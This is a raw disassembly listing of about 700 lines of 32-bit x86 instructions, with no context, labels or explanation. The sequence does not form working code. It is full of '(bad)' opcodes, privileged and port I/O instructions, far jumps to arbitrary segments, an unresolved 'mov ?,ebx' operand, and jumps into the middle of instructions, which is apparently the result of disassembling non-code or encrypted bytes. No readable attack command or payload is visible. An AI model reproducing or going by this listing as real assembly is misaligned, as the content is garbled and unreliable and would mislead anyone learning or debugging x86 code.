  41d75c:	jmp    0xcdc8:0x2927cdd6
  41d763:	int3   
  41d764:	sbb    cl,BYTE PTR [edi-0x32]
  41d767:	inc    edx
  41d768:	push   ebp
  41d769:	data16 mov ah,0x51
  41d76c:	or     BYTE PTR [ebx-0x77],0x96
  41d770:	mov    esi,0x61d09d98
  41d775:	icebp  
  41d776:	sub    DWORD PTR [ebx+0x624f55be],edi
  41d77c:	repnz les edi,FWORD PTR [edi*4-0x244b8557]
  41d784:	(bad)  
  41d786:	inc    esi
  41d787:	loop   0x41d7cf
  41d789:	stc    
  41d78a:	leave  
  41d78b:	inc    esp
  41d78c:	imul   ebx,ebp,0x53aa436e
  41d792:	push   edx
  41d793:	inc    eax
  41d794:	and    ah,bl
  41d796:	inc    eax
  41d797:	and    BYTE PTR [ebp+ebp*1-0x7b],0x29
  41d79c:	add    BYTE PTR [edx-0x3427c57f],ah
  41d7a2:	js     0x41d810
  41d7a4:	lahf   
  41d7a5:	les    ebx,FWORD PTR [esi]
  41d7a7:	popf   
  41d7a8:	push   esi
  41d7a9:	das    
  41d7aa:	push   eax
  41d7ab:	ret    0xd98b
  41d7ae:	jmp    0x41d7f1
  41d7b0:	jb     0x41d778
  41d7b2:	into   
  41d7b3:	mov    cl,BYTE PTR [esi+esi*2+0xd]
  41d7b7:	push   0xffffff81
  41d7b9:	int    0x88
  41d7bb:	fs mov ecx,edi
  41d7be:	lock lds esi,FWORD PTR [ecx+0x76b46eef]
  41d7c5:	mov    esp,0xb4d59ee0
  41d7ca:	mov    ds:0xfb102c04,al
  41d7cf:	into   
  41d7d0:	stc    
  41d7d1:	lea    ebx,[esi]
  41d7d3:	sar    DWORD PTR [ecx],0x3b
  41d7d6:	push   esp
  41d7d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7d8:	aam    0x5e
  41d7da:	lock out dx,al
  41d7dc:	inc    edx
  41d7dd:	and    bl,BYTE PTR [eax+0x632c061d]
  41d7e3:	and    dl,ch
  41d7e5:	and    eax,0x9f98eb9e
  41d7ea:	in     eax,0xf2
  41d7ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7ed:	repnz imul ebp,DWORD PTR [edi+0x5925d728],0xffffffec
  41d7f5:	push   eax
  41d7f6:	push   0xff84c8b
  41d7fb:	mov    ds:0x1a0e6e01,al
  41d800:	jl     0x41d807
  41d802:	icebp  
  41d803:	(bad)  
  41d804:	pop    esp
  41d805:	xchg   ecx,eax
  41d806:	push   esi
  41d807:	(bad)  
  41d808:	in     al,0x54
  41d80a:	das    
  41d80b:	dec    ebp
  41d80c:	sbb    al,0x5f
  41d80e:	inc    esi
  41d80f:	out    dx,eax
  41d810:	mov    ds:0x6284d0e0,eax
  41d816:	inc    ebp
  41d817:	iret   
  41d818:	sar    BYTE PTR [ebp+0x7],cl
  41d81b:	imul   eax,DWORD PTR [edx],0x40206c85
  41d821:	push   eax
  41d822:	pop    es
  41d823:	in     eax,0x14
  41d825:	mov    ebx,0xc770babc
  41d82a:	popf   
  41d82b:	add    bl,BYTE PTR [esi-0x43]
  41d82e:	mov    cl,0x2f
  41d830:	and    BYTE PTR [esi-0x33],ah
  41d833:	mov    bl,0xc2
  41d835:	sbb    BYTE PTR [esi+0x61b7e2a1],cl
  41d83b:	in     al,0x24
  41d83d:	jb     0x41d7e1
  41d83f:	daa    
  41d840:	and    bl,BYTE PTR [ebx-0x4569b60c]
  41d846:	jecxz  0x41d81f
  41d848:	repz jo 0x41d8aa
  41d84b:	jecxz  0x41d820
  41d84d:	dec    ebx
  41d84e:	mov    al,0x2c
  41d850:	inc    ebp
  41d851:	rol    BYTE PTR [edx],0x95
  41d854:	cmp    eax,0xc6861f17
  41d859:	test   al,0x95
  41d85b:	lahf   
  41d85c:	mov    eax,DWORD PTR [ecx+0x5f]
  41d85f:	mov    eax,ds:0x9e1a7757
  41d864:	(bad)  
  41d865:	lods   al,BYTE PTR ds:[esi]
  41d866:	clc    
  41d867:	or     ch,BYTE PTR [ecx]
  41d869:	sub    ecx,DWORD PTR ds:0xd88cf03b
  41d86f:	sbb    eax,0xa6c261da
  41d874:	inc    edx
  41d875:	pop    edi
  41d876:	call   esp
  41d878:	mov    dl,0x2d
  41d87a:	mov    esp,0x7000b44b
  41d87f:	xlat   BYTE PTR ds:[ebx]
  41d880:	mov    ds:0x585f3570,al
  41d885:	jmp    0x41d87c
  41d887:	sub    bh,BYTE PTR [ebx]
  41d889:	pop    esi
  41d88a:	jnp    0x41d836
  41d88c:	in     al,dx
  41d88d:	test   BYTE PTR [ecx-0x2a],cl
  41d890:	adc    ch,BYTE PTR [esi-0x2eed2842]
  41d896:	push   esi
  41d897:	(bad)  [edi-0x4c8cfcc]
  41d89d:	jne    0x41d88a
  41d89f:	cmp    al,0x4f
  41d8a1:	jno    0x41d914
  41d8a3:	pushf  
  41d8a4:	jne    0x41d8d2
  41d8a6:	rol    DWORD PTR [edi],cl
  41d8a8:	out    0xff,eax
  41d8aa:	repz stc 
  41d8ac:	adc    bh,bh
  41d8ae:	imul   edx,DWORD PTR ds:0x90e8023a,0x2
  41d8b5:	adc    BYTE PTR [edx-0x4c],bl
  41d8b8:	data16 arpl ax,di
  41d8bb:	or     edi,DWORD PTR [ecx+0x35dd0e59]
  41d8c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8c2:	or     BYTE PTR [edx+0x66],0x59
  41d8c6:	addr16 push esi
  41d8c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8c9:	das    
  41d8ca:	adc    eax,DWORD PTR [ecx]
  41d8cc:	xchg   ebx,eax
  41d8cd:	pop    ebx
  41d8ce:	(bad)  
  41d8cf:	add    eax,0xe813e807
  41d8d4:	dec    edx
  41d8d5:	or     DWORD PTR [ebx+ebp*1+0x1e],0xfffffffd
  41d8da:	dec    edi
  41d8db:	mov    ah,0x9
  41d8dd:	jl     0x41d921
  41d8df:	out    dx,eax
  41d8e0:	mov    ecx,0x259c8828
  41d8e5:	loop   0x41d923
  41d8e7:	outs   dx,BYTE PTR ds:[esi]
  41d8e8:	out    0xf3,al
  41d8ea:	push   esi
  41d8eb:	push   esi
  41d8ec:	xchg   DWORD PTR [eax+0x78b2cae5],ecx
  41d8f2:	xor    BYTE PTR [ecx],bl
  41d8f4:	jmp    0x41d8db
  41d8f6:	xchg   edi,eax
  41d8f7:	xchg   DWORD PTR [esi+0x11ab0189],ebx
  41d8fd:	pop    esp
  41d8fe:	adc    ch,BYTE PTR [edi+ecx*4]
  41d901:	cdq    
  41d902:	xchg   esi,eax
  41d903:	hlt    
  41d904:	xchg   esp,eax
  41d905:	fdiv   st,st(5)
  41d907:	movhps xmm1,QWORD PTR [edx]
  41d90a:	mov    al,0x4c
  41d90c:	adc    bl,BYTE PTR [ebp+edx*2-0x5e]
  41d910:	rcr    DWORD PTR [esi-0x29],0xa1
  41d914:	adc    bh,ch
  41d916:	xchg   esi,eax
  41d917:	fs je  0x41d8f9
  41d91a:	cmp    DWORD PTR [esi-0x3b1b95e0],0x24
  41d921:	adc    DWORD PTR [eax+eax*2],edi
  41d924:	scas   eax,DWORD PTR es:[edi]
  41d925:	fs loop 0x41d906
  41d928:	punpckhwd mm6,QWORD PTR [esp+edx*2]
  41d92c:	xor    BYTE PTR [edx],dl
  41d92e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d92f:	xchg   edx,eax
  41d930:	scas   eax,DWORD PTR es:[edi]
  41d931:	es adc eax,edi
  41d934:	mov    dh,0x57
  41d936:	imul   ebx,ebx,0xffffffac
  41d939:	call   0x2bcea693
  41d93e:	je     0x41d932
  41d940:	ficomp DWORD PTR [eax+0x7c]
  41d943:	sbb    bl,BYTE PTR [ecx]
  41d945:	in     eax,0x48
  41d947:	dec    edi
  41d948:	jo     0x41d999
  41d94a:	retf   
  41d94b:	xchg   esp,eax
  41d94c:	xor    al,0x33
  41d94e:	jns    0x41d8e8
  41d950:	sbb    ah,BYTE PTR [ebx+0xc]
  41d953:	arpl   WORD PTR [ecx-0x1a],si
  41d956:	rol    DWORD PTR [edi-0x53],1
  41d959:	shr    bl,1
  41d95b:	xchg   esp,eax
  41d95c:	push   0x53
  41d95e:	les    ebp,FWORD PTR [ebp+0x3c]
  41d961:	cmp    dh,BYTE PTR [ebx-0x88229e5]
  41d967:	inc    ebx
  41d968:	dec    edi
  41d969:	aam    0x63
  41d96b:	cli    
  41d96c:	(bad)  
  41d96d:	icebp  
  41d96e:	lods   eax,DWORD PTR ds:[esi]
  41d96f:	inc    eax
  41d970:	push   0x51
  41d972:	and    DWORD PTR [ebx-0x33],ecx
  41d975:	in     eax,0x66
  41d977:	inc    esp
  41d978:	sub    al,0x9c
  41d97a:	ss push cs
  41d97c:	repnz dec edx
  41d97e:	dec    edx
  41d97f:	xchg   ebx,eax
  41d981:	stos   BYTE PTR es:[edi],al
  41d982:	xchg   BYTE PTR ds:0x4c255815,al
  41d988:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d989:	adc    WORD PTR [eax+0x425b74dc],0xff8b
  41d991:	out    dx,al
  41d992:	pop    ss
  41d993:	xchg   ecx,eax
  41d994:	outs   dx,BYTE PTR ds:[esi]
  41d995:	ficomp DWORD PTR [edi+eax*2-0x17]
  41d999:	call   DWORD PTR [edx-0x70b86279]
  41d99f:	mov    ebx,0xf0ed555d
  41d9a4:	mov    dh,BYTE PTR [edx+0x70]
  41d9a7:	mov    ecx,0x4e8b783e
  41d9ac:	fnstcw WORD PTR [eax+0x2084dbc1]
  41d9b2:	imul   esp,ebp,0xffffffba
  41d9b5:	jmp    0x41da2e
  41d9b7:	ror    DWORD PTR [eax+ebp*2],cl
  41d9ba:	dec    ecx
  41d9bb:	jbe    0x41d950
  41d9bd:	add    esi,edi
  41d9bf:	daa    
  41d9c0:	adc    BYTE PTR [ecx],ch
  41d9c2:	jecxz  0x41da26
  41d9c4:	xchg   esi,eax
  41d9c5:	sbb    BYTE PTR [ebx-0x491cfb91],bh
  41d9cb:	and    ebx,DWORD PTR [ebp-0x76]
  41d9ce:	les    ebp,FWORD PTR [esp+eax*8]
  41d9d1:	mov    ds:0x2519b65a,al
  41d9d6:	nop
  41d9d7:	out    dx,eax
  41d9d8:	je     0x41d9a7
  41d9da:	nop
  41d9db:	adc    al,0x29
  41d9dd:	dec    esp
  41d9de:	loop   0x41d98f
  41d9e0:	adc    ch,BYTE PTR [ecx+ecx*8]
  41d9e3:	inc    ebx
  41d9e4:	cwde   
  41d9e5:	test   al,0x91
  41d9e7:	fnstenv [esi+ecx*4-0x11]
  41d9eb:	das    
  41d9ec:	mov    esi,DWORD PTR [eax+0x41]
  41d9ef:	ds mov ch,0xe4
  41d9f2:	jmp    0x41da57
  41d9f4:	push   esp
  41d9f5:	xchg   BYTE PTR [ebp-0x66],al
  41d9f8:	pop    edx
  41d9f9:	out    dx,eax
  41d9fa:	test   ah,dh
  41d9fc:	jmp    0xecbf4300
  41da01:	push   ebx
  41da02:	mov    al,ds:0x4c138313
  41da07:	sub    ebp,edi
  41da09:	push   ds
  41da0a:	cwde   
  41da0b:	aas    
  41da0c:	mov    ecx,0x2d79adf8
  41da11:	adc    ebx,DWORD PTR [ebx+0x50c40aff]
  41da17:	jb     0x41d9df
  41da19:	repnz outs dx,BYTE PTR ds:[esi]
  41da1b:	sub    al,0x9d
  41da1d:	pop    edi
  41da1e:	ds (bad) 
  41da20:	pop    esi
  41da21:	repnz mov ds:0x63b0e8c8,al
  41da27:	hlt    
  41da28:	das    
  41da29:	and    al,0x17
  41da2b:	cs retf 
  41da2d:	dec    ecx
  41da2e:	cmc    
  41da2f:	xor    ebp,0x8b9405ca
  41da35:	sub    ebp,DWORD PTR [esi-0x4e6edfd6]
  41da3b:	adc    eax,0x2390461
  41da40:	mov    ds:0x646b0b1a,al
  41da45:	pop    ecx
  41da46:	leave  
  41da47:	jecxz  0x41d9e3
  41da49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da4a:	ins    BYTE PTR es:[edi],dx
  41da4b:	aas    
  41da4c:	mov    ebp,0x80073434
  41da51:	xchg   ebx,eax
  41da52:	jl     0x41da04
  41da54:	int    0x26
  41da56:	loope  0x41da79
  41da58:	adc    DWORD PTR [edx-0x9111d52],esp
  41da5e:	jmp    0x59f04745
  41da63:	mov    ds,ecx
  41da65:	mov    ah,0xf9
  41da67:	dec    edi
  41da68:	in     al,0x3f
  41da6a:	cld    
  41da6b:	aaa    
  41da6c:	fcmovbe st,st(3)
  41da6e:	mov    ah,0xbd
  41da70:	jle    0x41da23
  41da72:	imul   ebp,DWORD PTR [ecx],0x6229a1cb
  41da78:	push   ecx
  41da79:	mov    esp,0x9ee0235f
  41da7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da7f:	push   edx
  41da80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da81:	mov    bl,0xd9
  41da83:	push   0x41
  41da85:	loop   0x41da4d
  41da87:	aas    
  41da88:	div    BYTE PTR [edi+0x28933313]
  41da8e:	es push esi
  41da90:	(bad)
  41da93:	sub    al,BYTE PTR fs:[edx]
  41da96:	sub    al,0x2e
  41da98:	pop    esi
  41da99:	int    0xcc
  41da9b:	push   ss
  41da9c:	gs shr ch,1
  41da9f:	pop    ds
  41daa0:	inc    esp
  41daa1:	test   al,0x92
  41daa3:	lahf   
  41daa4:	iret   
  41daa5:	cmp    BYTE PTR ds:0x959d6c89,bl
  41daab:	(bad)  
  41daac:	fsub   DWORD PTR [ebx-0x36]
  41daaf:	and    cl,al
  41dab1:	in     eax,dx
  41dab2:	int    0x62
  41dab4:	adc    eax,0xcaeb7292
  41dab9:	mov    dl,0xf5
  41dabb:	mov    edi,0xc0ea1d37
  41dac0:	dec    eax
  41dac1:	pop    ds
  41dac2:	mov    ah,0x53
  41dac4:	add    dh,BYTE PTR [ebx+0x296e6787]
  41daca:	test   DWORD PTR [edi-0x3ae89b9a],esp
  41dad0:	adc    al,0x6e
  41dad2:	cld    
  41dad3:	add    cl,BYTE PTR [esi+0x600e9953]
  41dad9:	clc    
  41dada:	sar    DWORD PTR ds:0xd1b9f09d,0x91
  41dae1:	rcl    BYTE PTR [ebx+0x539a9c5a],0x4f
  41dae8:	add    eax,0x7ee94497
  41daed:	dec    esp
  41daee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41daef:	or     BYTE PTR [eax],bh
  41daf1:	shr    DWORD PTR [ecx-0x55],cl
  41daf4:	idiv   ebp
  41daf6:	arpl   WORD PTR [edx+edi*4+0x6e],bp
  41dafa:	loopne 0x41daf3
  41dafc:	sti    
  41dafd:	call   0x7fcba9a8
  41db02:	inc    edx
  41db03:	retf   0xc1a0
  41db06:	outs   dx,DWORD PTR ds:[esi]
  41db07:	pushf  
  41db08:	loopne 0x41db55
  41db0a:	dec    edi
  41db0b:	enter  0x1916,0x79
  41db0f:	pushf  
  41db10:	in     eax,0x3d
  41db12:	push   cs
  41db13:	jne    0x41daa3
  41db15:	fwait
  41db16:	xor    eax,0xc50c7a63
  41db1b:	sbb    al,0xcf
  41db1d:	and    ch,BYTE PTR [edi]
  41db1f:	div    dl
  41db21:	fnstsw WORD PTR [ebx]
  41db23:	sbb    dl,0x7e
  41db26:	push   ebx
  41db27:	mov    eax,ds:0x2f373ec9
  41db2c:	in     al,dx
  41db2d:	adc    eax,esi
  41db2f:	push   ds
  41db30:	popa   
  41db31:	repz mov dl,0x1f
  41db34:	mov    ch,0xb5
  41db36:	and    BYTE PTR [edi+0x61],cl
  41db39:	xchg   esp,eax
  41db3a:	stos   DWORD PTR es:[edi],eax
  41db3b:	and    BYTE PTR [edi+0x24],cl
  41db3e:	mov    dl,0x80
  41db40:	outs   dx,BYTE PTR ds:[esi]
  41db41:	bound  esp,QWORD PTR [ecx]
  41db43:	pop    ebx
  41db44:	jmp    0x63:0x4a151129
  41db4b:	jb     0x41dba5
  41db4d:	mov    bl,0xb
  41db4f:	adc    cl,cl
  41db51:	out    dx,eax
  41db52:	xor    BYTE PTR [eax-0x1c6a71c2],cl
  41db58:	or     BYTE PTR [esi],bl
  41db5a:	bound  ebx,QWORD PTR [esi]
  41db5c:	data16 mov ah,0xf7
  41db5f:	push   esi
  41db60:	out    dx,al
  41db61:	aam    0xa1
  41db63:	sub    al,0xe8
  41db65:	fist   WORD PTR [edi+eiz*4-0x4b]
  41db69:	add    al,0xc8
  41db6b:	fwait
  41db6c:	(bad)  
  41db6d:	xchg   ebp,eax
  41db6e:	loope  0x41db25
  41db70:	pop    edx
  41db71:	test   al,0xb1
  41db73:	shr    DWORD PTR [ebx],1
  41db75:	pop    esp
  41db76:	sub    al,0xee
  41db78:	ror    BYTE PTR [esi+eax*4-0x4bd3f13b],1
  41db7f:	mov    ebx,0xf84941fc
  41db84:	push   ebp
  41db85:	int3   
  41db86:	pusha  
  41db87:	aam    0x90
  41db89:	jb     0x41db0b
  41db8b:	add    al,0x41
  41db8d:	xchg   esp,eax
  41db8e:	pop    ss
  41db8f:	mov    cl,0x74
  41db91:	aad    0xf9
  41db93:	cmp    dl,ch
  41db95:	sub    BYTE PTR [edi+eax*2],dh
  41db98:	xor    eax,0xbdcee0d8
  41db9d:	jnp    0x41dc06
  41db9f:	repnz and DWORD PTR [eax+0x7d],0x18
  41dba4:	mov    ds:0x5f600c97,eax
  41dba9:	leave  
  41dbaa:	rol    edx,1
  41dbac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbad:	popa   
  41dbae:	arpl   WORD PTR [eax-0x572c4512],dx
  41dbb4:	call   0xc7e37125
  41dbb9:	mov    ch,0x5f
  41dbbb:	sbb    edi,DWORD PTR [esp+edi*8]
  41dbbe:	xchg   ebx,eax
  41dbbf:	xchg   edx,eax
  41dbc0:	rol    BYTE PTR [ecx],1
  41dbc2:	add    esi,DWORD PTR [ecx]
  41dbc4:	push   0xb8b4b800
  41dbc9:	out    0x4f,eax
  41dbcb:	out    dx,eax
  41dbcc:	cld    
  41dbcd:	or     ah,BYTE PTR [edx+0x1ece4993]
  41dbd3:	mov    edi,0x34d1a491
  41dbd8:	inc    ecx
  41dbd9:	cld    
  41dbda:	and    eax,0xd4b9b458
  41dbdf:	cs pop edx
  41dbe1:	jb     0x41dc4c
  41dbe3:	out    dx,al
  41dbe4:	jno    0x41db78
  41dbe6:	xchg   esp,eax
  41dbe7:	and    ebp,ebp
  41dbe9:	fcom   QWORD PTR fs:[ecx]
  41dbec:	rol    BYTE PTR ss:[esi],1
  41dbef:	out    dx,al
  41dbf0:	xor    eax,0x4882a6ec
  41dbf5:	or     eax,0x82e09638
  41dbfa:	sub    ebp,eax
  41dbfc:	hlt    
  41dbfd:	into   
  41dbfe:	pusha  
  41dbff:	pushf  
  41dc00:	ins    DWORD PTR es:[edi],dx
  41dc01:	aam    0x5e
  41dc03:	hlt    
  41dc04:	push   ecx
  41dc05:	cmp    edx,edi
  41dc07:	adc    BYTE PTR [ecx+0x7292b311],dh
  41dc0d:	imul   ebx,ecx,0x4c
  41dc10:	push   ebx
  41dc11:	shr    DWORD PTR [edi+0x5568a1c6],cl
  41dc17:	xchg   edx,eax
  41dc18:	jns    0x41dc72
  41dc1a:	(bad)  
  41dc1b:	popa   
  41dc1c:	popf   
  41dc1d:	(bad)  [esi+0x39]
  41dc20:	or     DWORD PTR [ebp+0xa],esi
  41dc23:	ja     0x41dbc0
  41dc25:	adc    edi,DWORD PTR [ebp-0x5d]
  41dc28:	dec    edi
  41dc29:	xor    esi,ecx
  41dc2b:	pusha  
  41dc2c:	mov    DWORD PTR [esi+0x20],0x9af22800
  41dc33:	xor    eax,0x3c33e275
  41dc38:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc3a:	ror    BYTE PTR [ecx],1
  41dc3c:	aas    
  41dc3d:	xchg   dh,cl
  41dc3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc40:	cmp    dh,dl
  41dc42:	icebp  
  41dc43:	in     al,dx
  41dc44:	outs   dx,DWORD PTR ds:[esi]
  41dc45:	pop    es
  41dc46:	or     BYTE PTR [edx+0x63],dh
  41dc49:	repnz and al,0x1d
  41dc4c:	out    0x6c,eax
  41dc4e:	(bad)  
  41dc4f:	arpl   WORD PTR [ebx+0x1a2aeff6],sp
  41dc55:	ds mov dh,0x6f
  41dc58:	cmp    ecx,edx
  41dc5a:	xor    dl,bl
  41dc5c:	jmp    0xcf1fe9eb
  41dc61:	clc    
  41dc62:	jg     0x41dcc6
  41dc64:	push   esi
  41dc65:	(bad)  
  41dc66:	cmc    
  41dc67:	js     0x41dc52
  41dc69:	outs   dx,BYTE PTR ds:[esi]
  41dc6a:	xor    al,0xae
  41dc6c:	stos   BYTE PTR es:[edi],al
  41dc6d:	cli    
  41dc6e:	test   al,0xfa
  41dc70:	jmp    0x2e2a:0x189ac29b
  41dc77:	(bad)  
  41dc78:	lods   al,BYTE PTR ds:[esi]
  41dc79:	mov    esp,0x4143e0dc
  41dc7e:	sub    cl,0x79
  41dc81:	lahf   
  41dc82:	cmp    cl,BYTE PTR [esi]
  41dc84:	call   FWORD PTR [eax+0x64]
  41dc87:	arpl   WORD PTR ds:0xf17d01a6,dx
  41dc8d:	mov    ch,ch
  41dc8f:	xchg   ebx,eax
  41dc90:	dec    esi
  41dc91:	cmp    edi,ebx
  41dc93:	xchg   ebx,eax
  41dc94:	inc    edi
  41dc95:	cmp    bh,cl
  41dc97:	dec    edi
  41dc98:	dec    esp
  41dc99:	sub    eax,0x2a5eaff8
  41dc9e:	(bad)  
  41dc9f:	loopne 0x41dc2c
  41dca1:	into   
  41dca2:	(bad)  
  41dca3:	loop   0x41dc45
  41dca5:	(bad)  
  41dca6:	push   0xffffffc9
  41dca8:	mov    BYTE PTR [edi],dl
  41dcaa:	lea    edi,[edi+0x3c]
  41dcad:	bnd jb 0x41dcde
  41dcb0:	dec    ecx
  41dcb1:	xchg   DWORD PTR [ebp+ebp*8+0x31a79df0],edi
  41dcb8:	std    
  41dcb9:	mov    eax,DWORD PTR [eax-0x7d]
  41dcbc:	dec    ebp
  41dcbd:	pop    ds
  41dcbe:	jg     0x41dca5
  41dcc0:	enter  0xf2ca,0x85
  41dcc4:	xchg   BYTE PTR [ebx-0x644b2e9d],al
  41dcca:	adc    esp,DWORD PTR [edi-0x28dcd080]
  41dcd0:	iret   
  41dcd1:	cwde   
  41dcd2:	pop    ds
  41dcd3:	jbe    0x41dd1a
  41dcd5:	sub    ebp,DWORD PTR [ebx]
  41dcd7:	xor    DWORD PTR [ebp+0x5b],esp
  41dcda:	jne    0x41dd16
  41dcdc:	ins    BYTE PTR es:[edi],dx
  41dcdd:	std    
  41dcde:	ret    0x7ed2
  41dce1:	lds    ebx,FWORD PTR [esi-0x32]
  41dce4:	iret   
  41dce5:	mov    ebp,0x4dee5525
  41dcea:	stos   DWORD PTR es:[edi],eax
  41dceb:	rol    DWORD PTR [edi-0x62d095a6],0xc8
  41dcf2:	or     al,BYTE PTR [ebp-0x164db252]
  41dcf8:	xchg   edi,eax
  41dcf9:	cmp    eax,0x1b2eee3c
  41dcfe:	aas    
  41dcff:	xchg   esi,eax
  41dd00:	push   esi
  41dd01:	aam    0x34
  41dd03:	mov    edi,0xb18ca452
  41dd08:	push   esp
  41dd09:	jle    0x41dd8a
  41dd0b:	add    edx,DWORD PTR [edx]
  41dd0d:	inc    ebp
  41dd0e:	mov    ds,WORD PTR [edx+0x166f689d]
  41dd14:	out    0xc0,al
  41dd16:	inc    eax
  41dd17:	and    esp,DWORD PTR [edx-0x60456758]
  41dd1d:	dec    ebx
  41dd1e:	mov    cl,0xc7
  41dd20:	out    dx,eax
  41dd21:	daa    
  41dd22:	popa   
  41dd23:	popa   
  41dd24:	sbb    eax,0xe3d9ae98
  41dd29:	out    0x57,eax
  41dd2b:	jp     0x41dd28
  41dd2d:	not    edi
  41dd2f:	lods   al,BYTE PTR ds:[esi]
  41dd30:	mov    edi,0xc44f9cbd
  41dd35:	fsubr  QWORD PTR [ebx]
  41dd37:	daa    
  41dd38:	xchg   esp,eax
  41dd39:	xor    DWORD PTR [edi+edi*8],ebp
  41dd3c:	mov    bh,0x28
  41dd3e:	aas    
  41dd3f:	cmc    
  41dd40:	mov    ebp,0xd6f55f1
  41dd45:	aad    0x6a
  41dd47:	xchg   ebx,eax
  41dd48:	pop    ss
  41dd49:	sub    ecx,DWORD PTR [ebx-0x4a43f685]
  41dd4f:	xor    ebx,DWORD PTR [edi+0x4f]
  41dd52:	pop    DWORD PTR [esi-0x7f23bca1]
  41dd58:	in     al,0xb3
  41dd5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd5b:	mov    esi,0x3504e894
  41dd60:	and    bl,dl
  41dd62:	iret   
  41dd63:	test   DWORD PTR [eax],edi
  41dd65:	adc    DWORD PTR [esi+0x7cd3ae8f],ecx
  41dd6b:	scas   eax,DWORD PTR es:[edi]
  41dd6c:	outs   dx,DWORD PTR ds:[esi]
  41dd6d:	cmp    bl,al
  41dd6f:	test   edi,ebp
  41dd71:	mov    edi,0xad2f2715
  41dd76:	lods   al,BYTE PTR ds:[esi]
  41dd77:	adc    ah,BYTE PTR [edi]
  41dd79:	mov    ecx,0x79ba4a03
  41dd7e:	dec    esi
  41dd7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd80:	mov    ?,ebx
  41dd82:	mov    ebp,0x4e03a3a8
  41dd87:	push   ebp
  41dd88:	aam    0x59
  41dd8a:	mov    ecx,0xe23edf14
  41dd8f:	inc    esi
  41dd90:	jne    0x41dd17
  41dd92:	sbb    DWORD PTR [eax+0x5a],0x65
  41dd96:	and    eax,0x351231a8
  41dd9b:	inc    ebp
  41dd9c:	stos   BYTE PTR es:[edi],al
  41dd9d:	push   0x10
  41dd9f:	sub    dh,BYTE PTR [ebx]
  41dda1:	xchg   edi,eax
  41dda2:	(bad)  
  41dda3:	xchg   BYTE PTR [ecx+0x1afefb8b],ah
  41dda9:	ret    0x2b5a
  41ddac:	push   ebx
  41ddad:	cli    
  41ddae:	and    BYTE PTR [edx],ah
  41ddb0:	adc    BYTE PTR [ebx],bh
  41ddb2:	ret    
  41ddb3:	and    DWORD PTR [edi-0x10d88a88],esp
  41ddb9:	nop
  41ddba:	(bad)  [eax-0x6d40d53c]
  41ddc0:	adc    DWORD PTR [edx],edi
  41ddc2:	add    ch,BYTE PTR [esi+0x3e]
  41ddc5:	mov    cl,0xcd
  41ddc7:	dec    ecx
  41ddc8:	mov    bl,0xab
  41ddca:	xchg   esi,eax
  41ddcb:	push   DWORD PTR [ebx-0x1b]
  41ddce:	sub    BYTE PTR ds:0xf4019c8d,cl
  41ddd4:	lock pop ebp
  41ddd6:	jecxz  0x41de23
  41ddd8:	imul   eax,DWORD PTR [edx],0x5b056152
  41ddde:	pop    ebx
  41dddf:	sbb    al,0xcb
  41dde1:	mov    BYTE PTR [esi],dh
  41dde3:	mov    al,0x1d
  41dde5:	xchg   DWORD PTR [eax],esp
  41dde7:	push   ebp
  41dde8:	inc    ecx
  41dde9:	adc    al,0x4e
  41ddeb:	xor    BYTE PTR [esi-0x65],dh
  41ddee:	jae    0x41ddaf
  41ddf0:	or     edi,DWORD PTR [eax]
  41ddf2:	ss stos BYTE PTR es:[edi],al
  41ddf4:	pop    ss
  41ddf5:	fst    DWORD PTR [edx]
  41ddf7:	hlt    
  41ddf8:	mov    ds:0x3f8b246f,al
  41ddfd:	fld    DWORD PTR [eax+esi*2]
  41de00:	iret   
  41de01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de02:	sbb    DWORD PTR [ecx],ebp
  41de04:	mov    edx,0xfe0dbd5f
  41de09:	cs hlt 
  41de0b:	or     DWORD PTR [edi],ebp
  41de0d:	in     al,0xf2
  41de0f:	inc    edi
  41de10:	fmul   QWORD PTR [ebx-0x10]
  41de13:	lea    ebp,[eax+ecx*1-0x1]
  41de17:	pop    esi
  41de18:	daa    
  41de19:	das    
  41de1a:	jmp    0x37d92f0c
  41de1f:	icebp  
  41de20:	mov    ecx,0x56374bef
  41de25:	imul   BYTE PTR [ebx+0x5d6425bc]
  41de2b:	test   al,0xd0
  41de2d:	jecxz  0x41de74
  41de2f:	or     DWORD PTR [edi-0x6109f62a],ecx
  41de35:	shr    BYTE PTR [esi],cl
  41de37:	cmc    
  41de38:	xchg   esp,eax
  41de39:	mov    eax,0x2068a13
  41de3e:	addr16 out dx,al
  41de40:	rol    BYTE PTR [ebp-0x5e6d6113],0x98
  41de47:	ret    0xb0b8
  41de4a:	outs   dx,BYTE PTR ds:[esi]
  41de4b:	cmp    al,0xc8
  41de4d:	(bad)  
  41de4e:	and    eax,0x4401d2d0
  41de53:	inc    ebx
  41de54:	(bad)
  41de58:	sbb    edx,DWORD PTR [eax+ebp*2+0x74]
  41de5c:	mov    edi,0xe5365be2
  41de61:	inc    eax
  41de62:	gs into 
  41de64:	ja     0x41de32
  41de66:	push   eax
  41de67:	mov    bl,0xf5
  41de69:	mov    dh,0x41
  41de6b:	adc    BYTE PTR [esi],bl
  41de6d:	cld    
  41de6e:	fsubrp st(5),st
  41de70:	call   0xaf04:0xfa56d500
  41de77:	xchg   edi,eax
  41de78:	cmp    ah,BYTE PTR [ecx-0x56]
  41de7b:	ret    0x75dc
  41de7e:	aad    0xbb
  41de80:	ins    DWORD PTR es:[edi],dx
  41de81:	xchg   DWORD PTR [eax+0x7e30ce35],eax
  41de87:	lods   al,BYTE PTR ds:[esi]
  41de88:	sar    ah,0xfd
  41de8b:	and    ah,ch
  41de8d:	adc    BYTE PTR [ebx-0xa],cl
  41de90:	retf   
